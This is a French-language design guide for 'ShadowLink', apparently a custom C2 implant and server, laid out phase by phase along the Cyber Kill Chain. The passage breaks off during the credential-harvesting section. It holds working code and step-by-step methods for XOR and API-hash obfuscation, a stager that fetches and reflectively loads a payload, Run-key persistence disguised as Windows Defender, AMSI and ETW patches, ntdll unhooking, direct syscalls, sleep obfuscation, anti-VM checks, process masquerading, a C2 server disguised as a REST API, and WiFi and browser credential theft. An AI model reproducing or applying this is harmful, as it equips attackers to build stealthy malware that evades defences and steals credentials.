# 📚 ShadowLink - Récapitulatif Complet des Techniques par Phase

> **Document de synthèse** : Ce guide détaille phase par phase toutes les techniques utilisées par l'agent et le serveur ShadowLink pour contourner les mesures de sécurité, avec des explications complètes et la définition de tous les acronymes.

---

## 📋 Table des Matières

1. [Glossaire des Acronymes](#-glossaire-des-acronymes)
2. [Vue d'ensemble de la Kill Chain](#-vue-densemble-de-la-kill-chain)
3. [Phase 1 : Weaponization](#-phase-1--weaponization-création-du-payload)
4. [Phase 2 : Delivery](#-phase-2--delivery-livraison)
5. [Phase 3 : Exploitation](#-phase-3--exploitation-exécution-initiale)
6. [Phase 4 : Installation](#-phase-4--installation-persistance)
7. [Phase 5 : Defense Evasion](#-phase-5--defense-evasion-évasion-des-défenses)
8. [Phase 6 : Command & Control](#-phase-6--command--control-c2)
9. [Phase 7 : Actions on Objectives](#-phase-7--actions-on-objectives)
10. [Résumé des contournements](#-résumé-des-contournements)

---

## 📖 Glossaire des Acronymes

### Sécurité et Détection

| Acronyme | Signification | Description |
|----------|---------------|-------------|
| **EDR** | Endpoint Detection and Response | Solution de sécurité qui surveille et répond aux menaces sur les terminaux (postes de travail, serveurs) |
| **AV** | Antivirus | Logiciel qui détecte et supprime les logiciels malveillants |
| **AMSI** | Antimalware Scan Interface | Interface Windows permettant aux applications d'envoyer du contenu à l'antivirus pour analyse |
| **ETW** | Event Tracing for Windows | Système de journalisation haute performance de Windows utilisé par les EDR |
| **IOC** | Indicator of Compromise | Indice technique d'une compromission (hash, IP, domaine, etc.) |
| **SIEM** | Security Information and Event Management | Plateforme centralisant les logs de sécurité pour analyse |
| **UAC** | User Account Control | Mécanisme Windows demandant confirmation pour les actions administratives |
| **PPL** | Protected Process Light | Protection Windows empêchant la modification de certains processus critiques |

### Réseau et Communication

| Acronyme | Signification | Description |
|----------|---------------|-------------|
| **C2/C&C** | Command and Control | Serveur permettant à l'attaquant de contrôler l'agent à distance |
| **TLS** | Transport Layer Security | Protocole cryptographique sécurisant les communications réseau (successeur de SSL) |
| **HTTPS** | HyperText Transfer Protocol Secure | HTTP sécurisé par TLS, port standard 443 |
| **DNS** | Domain Name System | Système traduisant les noms de domaine en adresses IP |
| **DoH** | DNS over HTTPS | DNS encapsulé dans HTTPS pour la confidentialité |
| **API** | Application Programming Interface | Interface permettant aux programmes de communiquer entre eux |
| **REST** | Representational State Transfer | Architecture pour les APIs web utilisant HTTP |

### Système Windows

| Acronyme | Signification | Description |
|----------|---------------|-------------|
| **PE** | Portable Executable | Format de fichier exécutable Windows (.exe, .dll) |
| **DLL** | Dynamic Link Library | Bibliothèque de code partagé sous Windows |
| **PEB** | Process Environment Block | Structure Windows contenant les informations d'un processus |
| **NTDLL** | NT Layer DLL | DLL fondamentale Windows servant d'interface avec le kernel |
| **LSASS** | Local Security Authority Subsystem Service | Processus gérant l'authentification Windows |
| **WMI** | Windows Management Instrumentation | Infrastructure de gestion et monitoring Windows |
| **COM** | Component Object Model | Architecture de composants Microsoft |
| **ROP** | Return-Oriented Programming | Technique exploitant des fragments de code existants |
| **DEP** | Data Execution Prevention | Protection empêchant l'exécution de code dans les zones de données |
| **ASLR** | Address Space Layout Randomization | Randomisation des adresses mémoire pour compliquer les exploits |

### Chiffrement

| Acronyme | Signification | Description |
|----------|---------------|-------------|
| **AES** | Advanced Encryption Standard | Algorithme de chiffrement symétrique standard |
| **CBC** | Cipher Block Chaining | Mode de chiffrement par blocs chaînés |
| **XOR** | Exclusive OR | Opération logique utilisée pour le chiffrement simple |
| **RC4** | Rivest Cipher 4 | Algorithme de chiffrement par flux |
| **IV** | Initialization Vector | Valeur aléatoire utilisée pour le chiffrement |

### Attaque et Techniques

| Acronyme | Signification | Description |
|----------|---------------|-------------|
| **BYOVD** | Bring Your Own Vulnerable Driver | Technique utilisant un driver vulnérable signé pour attaquer le kernel |
| **PPID** | Parent Process ID | Identifiant du processus parent |
| **LOLBin** | Living Off The Land Binary | Binaire légitime Windows utilisé pour des actions malveillantes |
| **RAT** | Remote Access Trojan | Cheval de Troie permettant l'accès distant |
| **APT** | Advanced Persistent Threat | Groupe d'attaquants sophistiqués et persistants |

---

## 🔄 Vue d'ensemble de la Kill Chain

La Cyber Kill Chain (Lockheed Martin) décrit les 7 étapes d'une cyberattaque :

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           CYBER KILL CHAIN                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐ │
│  │      1       │   │      2       │   │      3       │   │      4       │ │
│  │ WEAPONIZATION│──►│   DELIVERY   │──►│ EXPLOITATION │──►│ INSTALLATION │ │
│  │ Création     │   │  Livraison   │   │  Exécution   │   │  Persistance │ │
│  └──────────────┘   └──────────────┘   └──────────────┘   └──────────────┘ │
│                                                                  │          │
│                                                                  ▼          │
│  ┌──────────────┐   ┌──────────────┐   ┌──────────────┐                    │
│  │      7       │   │      6       │   │      5       │                    │
│  │   ACTIONS    │◄──│     C2       │◄──│   DEFENSE    │◄───────────────────│
│  │  Objectifs   │   │   Contrôle   │   │   EVASION    │                    │
│  └──────────────┘   └──────────────┘   └──────────────┘                    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Tableau récapitulatif ShadowLink

| Phase | Mesure de Sécurité Contournée | Technique ShadowLink |
|-------|------------------------------|---------------------|
| 1. Weaponization | Analyse statique, signatures AV | Chiffrement XOR, taille réduite (stager 48KB) |
| 2. Delivery | Firewalls, proxies, IDS | HTTPS sur port 443, endpoints REST déguisés |
| 3. Exploitation | Exécution non autorisée | Reflective PE Loading (fileless) |
| 4. Installation | Détection de persistance | Registry Run key avec nom légitime |
| 5. Defense Evasion | EDR, AV, memory scanners | Syscalls directs, AMSI/ETW bypass, Sleep Obfuscation |
| 6. C2 | Détection réseau, blocage ports | Double chiffrement TLS+AES, traffic blending |
| 7. Actions | Détection d'activité malveillante | Commandes via syscalls directs, exfiltration chiffrée |

---

## 🔧 Phase 1 : Weaponization (Création du Payload)

### Objectif
Créer un agent (implant) qui sera difficile à détecter par les solutions de sécurité.

### Mesures de sécurité ciblées
- **Analyse statique** : Scanners qui analysent le fichier sans l'exécuter
- **Signatures antivirus** : Patterns de bytes connus comme malveillants
- **Sandboxes automatisées** : Environnements qui exécutent les fichiers suspects

### Techniques de contournement

#### 1. Chiffrement des chaînes de caractères (XOR Encryption)

**Problème** : Les strings en clair dans le binaire (IP serveur, noms de fonctions) sont détectables.

**Solution** : Chiffrer toutes les chaînes avec XOR avant compilation.

```
┌────────────────────────────────────────────────────────────────┐
│                    CHIFFREMENT XOR                             │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  Avant:  "192.168.1.1"  → Visible dans le binaire !           │
│                                                                │
│  Après:  {0x6b, 0x63, 0x68, 0x74...} ⊕ 0x5A = "192.168.1.1"  │
│                                                                │
│  L'AV ne peut plus matcher la signature "192.168.1.1"          │
└────────────────────────────────────────────────────────────────┘
```

**Implémentation Agent** :
```c
// IP chiffrée avec clé XOR 0x5A
static unsigned char encrypted_ip[] = {0x6b, 0x63, 0x68, 0x74, ...};

void xor_decrypt(char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;  // XOR chaque byte avec la clé
    }
}
```

#### 2. Architecture Stager/Agent

**Problème** : Un gros binaire (~480 KB) a plus de chances d'être détecté.

**Solution** : Séparer en deux composants :

```
┌─────────────────────────────────────────────────────────────────┐
│                     ARCHITECTURE 2 ÉTAPES                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  STAGER (~48 KB)              AGENT COMPLET (~480 KB)          │
│  ┌─────────────┐              ┌─────────────────────┐          │
│  │ Télécharge  │───HTTPS────▶│ Toutes les          │          │
│  │ + Déchiffre │              │ fonctionnalités     │          │
│  │ + Charge    │              │                     │          │
│  └─────────────┘              └─────────────────────┘          │
│                                                                 │
│  Avantages:                                                    │
│  • Petite empreinte initiale                                   │
│  • Agent jamais écrit sur disque (fileless)                    │
│  • Mise à jour facile de l'agent                               │
└─────────────────────────────────────────────────────────────────┘
```

#### 3. API Hashing (djb2)

**Problème** : Les noms de fonctions Windows dans le binaire révèlent les intentions.

**Solution** : Remplacer les noms par leurs hash et résoudre dynamiquement.

```
┌────────────────────────────────────────────────────────────────┐
│                      API HASHING                               │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  Normal:    Import Table → "VirtualAlloc", "CreateThread"     │
│             → L'AV voit les fonctions suspectes               │
│                                                                │
│  Avec hash: Pas d'imports visibles                            │
│             Au runtime: hash(0x9E4A0C4C) → VirtualAlloc       │
│                                                                │
│  L'AV ne peut pas savoir quelles APIs seront utilisées        │
└────────────────────────────────────────────────────────────────┘
```

---

## 📬 Phase 2 : Delivery (Livraison)

### Objectif
Transmettre l'agent vers la machine cible en passant les défenses réseau.

### Mesures de sécurité ciblées
- **Firewalls** : Bloquent les ports non-standards
- **IDS/IPS** : Intrusion Detection/Prevention Systems
- **Proxies SSL** : Inspectent le trafic HTTPS
- **Filtrage de contenu** : Bloquent les téléchargements suspects

### Techniques de contournement

#### 1. Transport HTTPS (Phase 11)

**Problème** : Le trafic TCP brut sur port 4444 est immédiatement suspect.

**Solution** : Utiliser HTTPS sur port 443, comme tout trafic web légitime.

```
┌────────────────────────────────────────────────────────────────┐
│              ÉVOLUTION DU TRANSPORT C2                         │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  AVANT (TCP brut):                                            │
│  Agent ──► [Port 4444] ──► Serveur                            │
│            ⚠️ Flagrant ! Bloqué par firewall                  │
│                                                                │
│  APRÈS (HTTPS):                                               │
│  Agent ──► [Port 443 HTTPS] ──► Serveur                       │
│            ✅ Identique au trafic web normal                  │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

**Implémentation Agent** :
```c
// Utilisation de WinHTTP (API Windows standard pour HTTPS)
HINTERNET hSession = WinHttpOpen(
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",  // User-Agent légitime
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
    WINHTTP_NO_PROXY_NAME,
    WINHTTP_NO_PROXY_BYPASS,
    0
);
```

#### 2. Endpoints REST déguisés

**Problème** : Des URLs comme `/command` ou `/beacon` sont suspectes.

**Solution** : Utiliser des endpoints qui ressemblent à une API légitime.

```
┌────────────────────────────────────────────────────────────────┐
│                    ENDPOINTS DÉGUISÉS                          │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  Endpoint Réel          Apparence          Fonction            │
│  ─────────────────────────────────────────────────────────────│
│  /api/v1/status        Health check API    Check-in agent     │
│  /api/v1/updates       Software update     Récupérer tâche    │
│  /api/v1/telemetry     Telemetry upload    Envoyer résultat   │
│  /api/v1/upload        File upload API     Upload fichier     │
│  /api/v1/download      File download API   Download fichier   │
│                                                                │
│  Pour un analyste réseau, cela ressemble à une application    │
│  normale qui vérifie ses mises à jour.                        │
└────────────────────────────────────────────────────────────────┘
```

**Implémentation Serveur** :
```python
class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/api/v1/updates':
            # Semble être une vérification de mise à jour
            # En réalité : envoie la prochaine commande à l'agent
            task = get_next_task(agent_id)
            self.send_response(200)
            self.send_encrypted_response(task)
```

#### 3. Double chiffrement

**Problème** : Même avec TLS, le contenu pourrait être inspecté (proxy SSL enterprise).

**Solution** : Chiffrer les données avec AES-256 avant de les envoyer via TLS.

```
┌─────────────────────────────────────────────────────────────────┐
│                 DOUBLE COUCHE DE CHIFFREMENT                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │                    TLS (HTTPS)                            │  │
│  │  ┌─────────────────────────────────────────────────────┐  │  │
│  │  │                 AES-256-CBC                         │  │  │
│  │  │  ┌───────────────────────────────────────────────┐  │  │  │
│  │  │  │          Données JSON (plaintext)             │  │  │  │
│  │  │  │  {"hostname": "PC01", "output": "whoami..."}  │  │  │  │
│  │  │  └───────────────────────────────────────────────┘  │  │  │
│  │  └─────────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  Même si le TLS est cassé (proxy SSL), les données restent     │
│  illisibles sans la clé AES partagée agent/serveur.            │
└─────────────────────────────────────────────────────────────────┘
```

---

## 💥 Phase 3 : Exploitation (Exécution Initiale)

### Objectif
Exécuter l'agent sur la machine cible sans laisser de traces sur le disque.

### Mesures de sécurité ciblées
- **Application Whitelisting** : N'autorise que les binaires approuvés
- **Analyse comportementale** : Détecte les exécutions suspectes
- **File-based scanning** : Scanne les fichiers avant exécution

### Techniques de contournement

#### 1. Reflective PE Loading (Chargement réflectif)

**Problème** : Écrire un .exe sur le disque déclenche l'AV.

**Solution** : Charger le PE directement en mémoire sans jamais toucher le disque.

```
┌────────────────────────────────────────────────────────────────┐
│               REFLECTIVE PE LOADING                            │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  Exécution normale:                                           │
│  1. Fichier écrit sur disque    ← AV scanne ici !             │
│  2. CreateProcess() l'exécute                                 │
│                                                                │
│  Reflective Loading (fileless):                               │
│  1. PE téléchargé en mémoire (jamais sur disque)              │
│  2. Parser les headers PE manuellement                        │
│  3. Allouer mémoire et copier les sections                    │
│  4. Résoudre les imports (LoadLibrary, GetProcAddress)        │
│  5. Appliquer les relocations si nécessaire                   │
│  6. Exécuter l'entry point                                    │
│                                                                │
│  Avantage: L'AV basé sur fichiers ne voit rien !              │
└────────────────────────────────────────────────────────────────┘
```

**Implémentation Stager** :
```c
int reflective_load_pe(BYTE *pe_data, size_t pe_size) {
    // 1. Parser les headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pe_data;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pe_data + dosHeader->e_lfanew);
    
    // 2. Allouer mémoire pour l'image
    void *imageBase = VirtualAlloc(
        (LPVOID)ntHeaders->OptionalHeader.ImageBase,
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE  // RWX pour exécution
    );
    
    // 3. Copier les sections
    // 4. Résoudre imports
    // 5. Appliquer relocations
    // 6. Exécuter entry point
    
    typedef int (*EntryPoint)(void);
    EntryPoint entry = (EntryPoint)(imageBase + 
        ntHeaders->OptionalHeader.AddressOfEntryPoint);
    return entry();
}
```

#### 2. Déchiffrement RC4 du payload

**Problème** : Le payload téléchargé pourrait être analysé en transit.

**Solution** : Chiffrer avec RC4 (algorithme de flux léger et rapide).

```
┌────────────────────────────────────────────────────────────────┐
│                    FLUX DU STAGER                              │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  1. HTTPS Download ─────────────────────────────────────┐     │
│     GET /payload.bin                                     │     │
│                                                          ▼     │
│  2. Réception payload chiffré ───────────────────────────│     │
│     [RC4 encrypted blob]                                 │     │
│                                                          ▼     │
│  3. Déchiffrement RC4 ───────────────────────────────────│     │
│     rc4_decrypt(blob, key) → PE valide                   │     │
│                                                          ▼     │
│  4. Reflective Load ─────────────────────────────────────│     │
│     Charger et exécuter en mémoire                       │     │
│                                                                │
│  Résultat: Agent exécuté, jamais écrit sur disque !           │
└────────────────────────────────────────────────────────────────┘
```

---

## 🔒 Phase 4 : Installation (Persistance)

### Objectif
Assurer que l'agent survivra aux redémarrages et se relancera automatiquement.

### Mesures de sécurité ciblées
- **Monitoring du registre** : Surveillance des clés Run
- **Audit des tâches planifiées** : Détection de nouvelles tâches
- **Contrôle des services** : Alertes sur nouveaux services

### Techniques de contournement

#### 1. Registry Run Key avec nom légitime

**Problème** : Une clé nommée "ShadowLink" serait immédiatement suspecte.

**Solution** : Utiliser un nom qui ressemble à un composant Windows légitime.

```
┌────────────────────────────────────────────────────────────────┐
│                    PERSISTANCE REGISTRY                        │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  Clé: HKCU\Software\Microsoft\Windows\CurrentVersion\Run      │
│                                                                │
│  ❌ Mauvais:  "ShadowLink" = "C:\malware\agent.exe"           │
│              → Suspect, nom révélateur                        │
│                                                                │
│  ✅ Bon:     "WindowsSecurityHealth" = "C:\Users\...\svc.exe" │
│              → Ressemble à Windows Defender                   │
│                                                                │
│  L'analyste doit vérifier chaque entrée individuellement      │
│  pour distinguer le légitime du malveillant.                  │
└────────────────────────────────────────────────────────────────┘
```

**Implémentation Agent** :
```c
int install_persistence(void) {
    HKEY hKey;
    RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey
    );
    
    // Nom qui semble légitime
    RegSetValueExA(
        hKey, 
        "WindowsSecurityHealth",  // Imite Windows Defender
        0, REG_SZ, 
        agent_path, 
        strlen(agent_path) + 1
    );
    
    RegCloseKey(hKey);
    return 0;
}
```

#### 2. Chemins de fichier discrets

**Problème** : Un fichier dans `C:\Temp\agent.exe` est suspect.

**Solution** : Copier dans des emplacements légitimes avec des noms banals.

```
Emplacements utilisés:
• %APPDATA%\Microsoft\Windows\svchost.exe
• %LOCALAPPDATA%\Microsoft\WindowsApps\RuntimeBroker.exe

Ces noms correspondent à des processus Windows légitimes.
```

---

## 🛡️ Phase 5 : Defense Evasion (Évasion des Défenses)

### Objectif
Éviter la détection par les solutions de sécurité pendant l'exécution.

### Mesures de sécurité ciblées
- **EDR (Endpoint Detection and Response)** : Surveillance comportementale avancée
- **AMSI (Antimalware Scan Interface)** : Analyse du contenu dynamique
- **ETW (Event Tracing for Windows)** : Journalisation des événements
- **Memory scanners** : Recherche de signatures en mémoire
- **Hooks usermode** : Interception des appels API par les EDR

### Techniques de contournement

#### 1. Direct Syscalls - Hell's Gate (Phase 11)

**Problème** : Les EDR "hookent" les fonctions dans ntdll.dll pour intercepter les appels.

```
┌────────────────────────────────────────────────────────────────┐
│                    HOOKS EDR                                   │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  Appel normal:                                                │
│  Agent → ntdll.dll → [HOOK EDR] → syscall → Kernel           │
│                          ↑                                    │
│                     L'EDR voit tout !                         │
│                                                                │
│  Le hook intercepte l'appel et peut:                          │
│  • Logger l'action                                            │
│  • Bloquer si malveillant                                     │
│  • Alerter l'analyste                                         │
└────────────────────────────────────────────────────────────────┘
```

**Solution Hell's Gate** : Lire le numéro syscall depuis ntdll et appeler directement.

```
┌────────────────────────────────────────────────────────────────┐
│                    DIRECT SYSCALLS                             │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  1. Lire ntdll.dll depuis le DISQUE (copie propre)            │
│     (pas la version en mémoire qui est hookée)                │
│                                                                │
│  2. Parser les exports, trouver NtAllocateVirtualMemory       │
│                                                                │
│  3. Chercher le pattern du syscall number:                    │
│     mov r10, rcx        ; 4C 8B D1                            │
│     mov eax, <NUMBER>   ; B8 XX XX 00 00  ← On extrait ça    │
│     syscall             ; 0F 05                               │
│                                                                │
│  4. Appeler syscall directement avec ce numéro:               │
│     Agent ────────────────────────► syscall → Kernel          │
│            (bypass complet du hook)                           │
│                                                                │
│  L'EDR ne voit RIEN car on ne passe plus par ses hooks !      │
└────────────────────────────────────────────────────────────────┘
```

**Implémentation** :
```c
typedef struct _SYSCALL_TABLE {
    DWORD NtAllocateVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtOpenProcess;
} SYSCALL_TABLE;

// Résoudre les numéros syscall depuis ntdll propre
int InitializeSyscallsHellsGate(SYSCALL_TABLE *table) {
    // Mapper ntdll depuis le disque
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", ...);
    
    // Parser et extraire les syscall numbers
    // Pattern: B8 XX XX 00 00 (mov eax, <number>)
    
    table->NtAllocateVirtualMemory = extracted_number;
    // ...
}
```

#### 2. AMSI Bypass (Phase 8)

**Problème** : AMSI permet à l'AV de scanner les scripts PowerShell et autres contenus dynamiques.

**Solution** : Patcher la fonction AmsiScanBuffer pour qu'elle retourne toujours "propre".

```
┌────────────────────────────────────────────────────────────────┐
│                    AMSI BYPASS                                 │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  Fonctionnement normal d'AMSI:                                │
│  PowerShell → AmsiScanBuffer() → Windows Defender → Verdict   │
│                                                                │
│  Après patch:                                                 │
│  PowerShell → AmsiScanBuffer() → return CLEAN (immédiat)     │
│                                                                │
│  Patch appliqué:                                              │
│  AmsiScanBuffer:                                              │
│    xor eax, eax    ; 31 C0  (eax = 0 = AMSI_RESULT_CLEAN)    │
│    ret             ; C3     (retour immédiat)                 │
│                                                                │
│  Tous les scripts sont maintenant considérés "propres" !      │
└────────────────────────────────────────────────────────────────┘
```

**Implémentation** :
```c
int bypass_amsi(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    void *pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Patch: xor eax, eax; ret
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    
    VirtualProtect(pAmsiScanBuffer, 16, oldProtect, &oldProtect);
    return 0;
}
```

#### 3. ETW Patching (Phase 8)

**Problème** : ETW permet aux EDR de recevoir des événements sur les activités du processus.

**Solution** : Patcher EtwEventWrite pour qu'elle ne fasse rien.

```
┌────────────────────────────────────────────────────────────────┐
│                    ETW PATCHING                                │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  ETW = Event Tracing for Windows                              │
│  • Trace les appels réseau                                    │
│  • Trace les opérations mémoire                               │
│  • Trace les créations de threads                             │
│  • ... utilisé par tous les EDR modernes                      │
│                                                                │
│  Patch:                                                       │
│  EtwEventWrite:                                               │
│    ret    ; C3  (retourne immédiatement sans rien faire)     │
│                                                                │
│  Résultat: L'EDR ne reçoit plus les événements du process !   │
└────────────────────────────────────────────────────────────────┘
```

#### 4. NTDLL Unhooking (Phase 8)

**Problème** : Les EDR modifient ntdll.dll en mémoire pour intercepter les appels.

**Solution** : Remplacer la section .text hookée par une copie propre.

```
┌────────────────────────────────────────────────────────────────┐
│                    NTDLL UNHOOKING                             │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  1. Mapper ntdll.dll depuis le disque (version originale)     │
│                                                                │
│  2. Comparer avec la version en mémoire (hookée)              │
│     Original:  mov r10, rcx; mov eax, XX; syscall; ret       │
│     Hookée:    jmp EDR_Hook  ← Modification EDR              │
│                                                                │
│  3. Copier la section .text propre sur la version hookée      │
│     memcpy(hooked_text, clean_text, text_size);               │
│                                                                │
│  Résultat: ntdll est "restaurée", les hooks sont supprimés !  │
└────────────────────────────────────────────────────────────────┘
```

#### 5. Sleep Obfuscation - Ekko (Phase 11)

**Problème** : Pendant le sleep (attente entre les beacons), le code de l'agent reste en mémoire et peut être scanné.

**Solution** : Chiffrer le code en mémoire pendant le sleep.

```
┌────────────────────────────────────────────────────────────────┐
│                  SLEEP OBFUSCATION (EKKO)                      │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  AVANT SLEEP         PENDANT SLEEP         APRÈS SLEEP        │
│  ────────────        ─────────────         ───────────        │
│  .text: CODE  ──XOR─▶ .text: %#@!&*  ──XOR─▶ .text: CODE     │
│  .data: DATA  ──XOR─▶ .data: $@#%^&  ──XOR─▶ .data: DATA     │
│  [Détectable]        [Illisible]           [Restauré]         │
│                                                                │
│  Technique:                                                   │
│  1. Chiffrer .text et .data avec XOR                          │
│  2. Créer une ROP chain pour le réveil:                       │
│     VirtualProtect → SystemFunction032 → NtContinue           │
│  3. Programmer un timer (CreateTimerQueueTimer)               │
│  4. Au timeout, le callback ROP déchiffre et restaure         │
│                                                                │
│  Le memory scanner ne trouve aucune signature connue !        │
└────────────────────────────────────────────────────────────────┘
```

#### 6. Anti-Debug et Anti-VM (Phase 7)

**Problème** : Les sandboxes automatisées analysent le comportement du malware.

**Solution** : Détecter ces environnements et modifier le comportement.

```
┌────────────────────────────────────────────────────────────────┐
│                    DÉTECTION SANDBOX/VM                        │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  ANTI-DEBUG:                                                  │
│  • IsDebuggerPresent() - API Windows directe                  │
│  • CheckRemoteDebuggerPresent() - Debugger distant            │
│  • Timing check - Un breakpoint ralentit l'exécution          │
│                                                                │
│  ANTI-VM:                                                     │
│  • Processus VM: vmtoolsd.exe, vboxservice.exe                │
│  • Ressources faibles: < 2GB RAM, < 2 CPU (sandbox typique)   │
│  • Registry keys: VMware, VirtualBox, Hyper-V                 │
│                                                                │
│  ANTI-SANDBOX:                                                │
│  • Processus d'analyse: procmon.exe, wireshark.exe            │
│  • Delayed execution: attendre 10s avant de s'activer         │
│  • User interaction: vérifier mouvement souris/clavier        │
│                                                                │
│  Si détecté → Comportement bénin ou terminaison               │
└────────────────────────────────────────────────────────────────┘
```

#### 7. Process Masquerading (PEB Manipulation)

**Problème** : Le nom du processus "agent.exe" est suspect dans la liste des processus.

**Solution** : Modifier le PEB pour que le processus semble être svchost.exe.

```
┌────────────────────────────────────────────────────────────────┐
│                    PROCESS MASQUERADING                        │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  Le PEB (Process Environment Block) contient:                 │
│  • ImagePathName: Chemin du binaire                           │
│  • CommandLine: Ligne de commande                             │
│                                                                │
│  Modification:                                                │
│  ImagePathName: C:\Users\...\agent.exe                        │
│           →    C:\Windows\System32\svchost.exe                │
│                                                                │
│  CommandLine: agent.exe                                       │
│          →   svchost.exe -k netsvcs                           │
│                                                                │
│  Dans Task Manager/Process Explorer, le process semble        │
│  être un service Windows légitime !                           │
└────────────────────────────────────────────────────────────────┘
```

---

## 📡 Phase 6 : Command & Control (C2)

### Objectif
Maintenir une communication bidirectionnelle fiable et discrète avec le serveur.

### Mesures de sécurité ciblées
- **Firewalls applicatifs** : Bloquent les applications non autorisées
- **Analyse de trafic** : Détection de patterns de beacon
- **Blocage par réputation** : IPs/domaines malveillants connus
- **Inspection SSL** : Déchiffrement du trafic HTTPS

### Techniques de contournement

#### 1. Architecture REST légitime

**Implémentation Serveur** :
```python
# server/server_https.py
class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Endpoint déguisé en API de mise à jour
        if self.path == '/api/v1/updates':
            agent_id = self.headers.get('X-Client-ID')
            task = get_pending_task(agent_id)
            if task:
                response = f"{task['id']}:{task['command']}"
            else:
                response = "NOTASK"
            self.send_encrypted_response(response)
    
    def do_POST(self):
        # Check-in déguisé en status API
        if self.path == '/api/v1/status':
            data = self.decrypt_request()
            register_agent(data)
            self.send_response(200)
```

#### 2. Flux de communication typique

```
┌─────────────────────────────────────────────────────────────────┐
│                    FLUX C2 SHADOWLINK                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  AGENT                                           SERVEUR        │
│    │                                                │           │
│    │  1. POST /api/v1/status (Check-in)            │           │
│    │     {hostname, username, os, arch, pid}       │           │
│    │ ──────────────────────────────────────────────►│           │
│    │                                                │           │
│    │◄──────────────────────────────────────────────│           │
│    │     {status: "ok", agent_id: "abc123"}        │           │
│    │                                                │           │
│    │  ... attente (beacon interval + jitter) ...   │           │
│    │                                                │           │
│    │  2. GET /api/v1/updates (Beacon)              │           │
│    │     X-Client-ID: abc123                        │           │
│    │ ──────────────────────────────────────────────►│           │
│    │                                                │           │
│    │◄──────────────────────────────────────────────│           │
│    │     "42:whoami" ou "NOTASK"                   │           │
│    │                                                │           │
│    │  3. POST /api/v1/telemetry (Résultat)         │           │
│    │     {task_id: 42, status: 0, output: "..."}   │           │
│    │ ──────────────────────────────────────────────►│           │
│    │                                                │           │
└─────────────────────────────────────────────────────────────────┘
```

#### 3. Jitter (variation temporelle)

**Problème** : Un beacon exactement toutes les 60 secondes est détectable par analyse statistique.

**Solution** : Ajouter une variation aléatoire (jitter).

```
Beacon interval: 60s
Jitter: 20%

Calcul: 60s ± (60 × 0.20) = 60s ± 12s
Plage réelle: 48s - 72s

Chaque beacon arrive à un moment différent, 
rendant le pattern moins prévisible.
```

---

## 🎯 Phase 7 : Actions on Objectives

### Objectif
Exécuter les actions finales : reconnaissance, credential harvesting, exfiltration.

### Mesures de sécurité ciblées
- **DLP (Data Loss Prevention)** : Détection d'exfiltration de données
- **Monitoring des accès** : Alertes sur accès aux credentials
- **Détection comportementale** : Activités anormales

### Techniques de contournement

#### 1. Exécution de commandes via syscalls directs

**Problème** : CreateProcess("cmd.exe") est surveillé par tous les EDR.

**Solution** : Utiliser les syscalls directs pour toutes les opérations sensibles.

```
┌────────────────────────────────────────────────────────────────┐
│              EXÉCUTION VIA SYSCALLS DIRECTS                    │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  Au lieu de:                                                  │
│  CreateProcess() → kernel32.dll → ntdll.dll → [HOOK] → kernel │
│                                                                │
│  On fait:                                                     │
│  DoSyscall(NtCreateUserProcess) ────────────────────► kernel  │
│                                                                │
│  L'EDR ne voit pas le CreateProcess car on ne l'appelle pas ! │
└────────────────────────────────────────────────────────────────┘
```

#### 2. Collecte de credentials (Phase 9)

```
┌────────────────────────────────────────────────────────────────┐
│                CREDENTIAL HARVESTING                           │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  WiFi Passwords:                                              │
│  • netsh wlan show profiles                                   │
│  • netsh wlan show profile name=X key=clear                   │
│  → Récupère les mots de passe WiFi en clair                   │
│                                                                │
│  Browser Credentials (chemins):                               │
│  • Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default     │
│    - Login Data (SQLite avec credentials)                     │
│    - Cookies, History                                         │
